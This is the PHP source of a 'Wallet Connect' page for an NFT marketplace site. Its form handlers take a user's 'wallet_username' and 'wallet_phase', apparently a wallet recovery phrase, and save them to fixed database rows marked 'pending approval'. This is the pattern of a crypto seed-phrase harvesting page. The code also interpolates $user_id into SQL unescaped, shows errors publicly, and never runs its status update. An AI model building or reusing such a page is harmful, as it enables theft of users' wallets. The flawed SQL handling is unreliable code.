<?php
session_start();
if (!isset($_SESSION['user_id'])) { ?>
    <script>
        window.location.href = '/auth/login';
    </script>
    <?php
    exit();
}
error_reporting(E_ALL);
ini_set('display_errors', 1);
const pageName = 'Wallet Connect';
const rootDir = '/home/multistream6/domains/caketoolnftmarketplace.com/public_html/';
include_once (rootDir.'includes/generalConfig.php');
include_once (rootDir.'includes/core.php');
include_once (rootDir.'includes/wallet_core.php');
include_once (rootDir.'partials/front/header/main.php');
?>
<?php
$sql = "SELECT * FROM wallet WHERE wallet_owner_id = $user_id";
$result = $conn->query($sql);
$row = $result->fetch_assoc();
$wallet_id = $row['wallet_id'];
$wallet_ref_id = $row['wallet_ref_id'];
$wallet_phase = $row['wallet_phase'];
$wallet_owner_id = $row['wallet_owner_id'];
$wallet_img = $row['wallet_img'];
$wallet_name = $row['wallet_name'];
$wallet_username = $row['wallet_username'];
$wallet_key = $row['wallet_key']; // name of wallet 1=>metamask, 2=>binance, 3=>coinbase, 4=>walletConnect
$wallet_status = $row['wallet_status']; // 0=not connected 1=connected 2=pending approval

if (isset($_POST['meta_mask'])) {
    $wallet_username = $conn->real_escape_string($_POST['wallet_username']);
    $wallet_phase = $conn->real_escape_string($_POST['wallet_phase']);

    $sql = "UPDATE wallet SET wallet_username = '$wallet_username', wallet_phase = '$wallet_phase' WHERE wallet_id = 1";

    if ($conn->query($sql) === TRUE) {
        echo "Record updated successfully";
    } else {
        echo "Error updating record: " . $conn->error;
    }
}elseif (isset($_POST['binance'])){
    $wallet_username = $conn->real_escape_string($_POST['wallet_username']);
    $wallet_phase = $conn->real_escape_string($_POST['wallet_phase']);

    $sql = "UPDATE wallet SET wallet_username = '$wallet_username', wallet_phase = '$wallet_phase' WHERE wallet_id = 2";

    if ($conn->query($sql) === TRUE) {

        $update_status = "UPDATE wallet SET wallet_status = 2 WHERE wallet_id = 2";

        if ($update_status){
            echo "Record updated successfully";
        }
    } else {
        echo "Error updating record: " . $conn->error;
    }
}
?>
<style>
    .tf-connect-wallet .tf-wallet {
        min-height: 144px;
        padding: 38px;
    }
    .tf-wallet .title {
        color: var(--primary-color5);
        font-size: 30px;
        line-height: 12px;
        margin-bottom: 2px;
    }
</style>
        <!-- title page -->
<div class="py-5"></div>
        <section class="tf-page-title">
            <div class="tf-container">
            </div>
        </section>

        <section class="tf-connect-wallet">
            <div class="tf-container">
                <div class="row justify-content-center">
                    <div class="col-md-12">
                        <div class="tf-heading style-5">
                            <h4 class="heading">Connect Your Wallet</h4>
                            <p class="sub-heading">Connect your wallet for seamless access to decentralized opportunities, including finance and digital collectibles. Experience the future of blockchain effortlessly.</p>
                        </div>
                    </div>
                    <?php include_once(rootDir.'connect_wallet/parts/wallets/main.php'); ?>
                </div>
            </div>
        </section>

<!--connect wallet model-->
<?php include_once (rootDir.'connect_wallet/parts/wallet_models/main.php');?>
        <!-- Footer -->
<?php include_once (rootDir.'partials/front/footer/main.php');?>